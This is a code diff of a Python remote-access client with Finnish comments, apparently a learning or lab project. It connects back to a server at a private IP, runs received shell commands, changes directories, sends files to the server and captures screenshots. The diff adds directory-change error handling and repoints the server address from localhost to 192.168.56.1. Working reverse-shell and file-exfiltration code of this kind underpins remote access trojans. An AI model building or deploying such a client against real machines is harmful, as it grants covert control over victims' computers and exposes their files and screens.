@@ -3,7 +3,6 @@ import subprocess
 import os
 import pyautogui
 
-from main_server import MainServer
 
 class MainClient:
     def __init__(self, ip:str, port:int):
@@ -37,14 +36,24 @@ class MainClient:
     def change_dir(self, s,command):
         #splitataan välilyönneistä ja otetaan indeksi 1 talteen
         s = self.s
-        path = command.split()[1]
-        #jos polku löytyy vaihdetaan dirri käyttäen os modulin chdir functiota
-        if os.path.exists(path):
-            os.chdir(path)
-            s.send(f'Directory changed to {os.getcwd()}'.encode())
-        #jos ei löydy niin ilmoitetaan serverille
-        else:
-            s.send(b'Invalid directory name')
+        try:
+            path = command.split()[1]
+            #jos polku löytyy vaihdetaan dirri käyttäen os modulin chdir functiota
+            if os.path.exists(path):
+                os.chdir(path)
+                s.send(f'Directory changed to {os.getcwd()}'.encode())
+            #jos ei löydy niin ilmoitetaan serverille
+            else:
+                s.send(b'Invalid directory name')
+        except IndexError: # jos annettu cd.. linuxissa
+            path = command.split()[0]
+            if os.path.exists(path):
+                os.chdir(path)
+                s.send(f'Directory changed to {os.getcwd()}'.encode())
+            else:
+                s.send(b'Invalid command')
+
+
 
     def run_command(self, s, command):
         s = self.s
@@ -69,7 +78,7 @@ class MainClient:
             elif command.startswith('cd') and len(command) > 3:
                 self.change_dir(s,command)
             elif command.startswith('download'):
-                self.download(s,command)
+                self.upload(s,command)
             elif command == 'screen':
                 screenshot = pyautogui.screenshot()
                 screenshot.save("screenshot.png")
@@ -85,5 +94,5 @@ class MainClient:
 
 
 if __name__ == '__main__':
-    appi = MainClient('127.0.0.1', 8888)
+    appi = MainClient('192.168.56.1', 8888)
     appi.main()
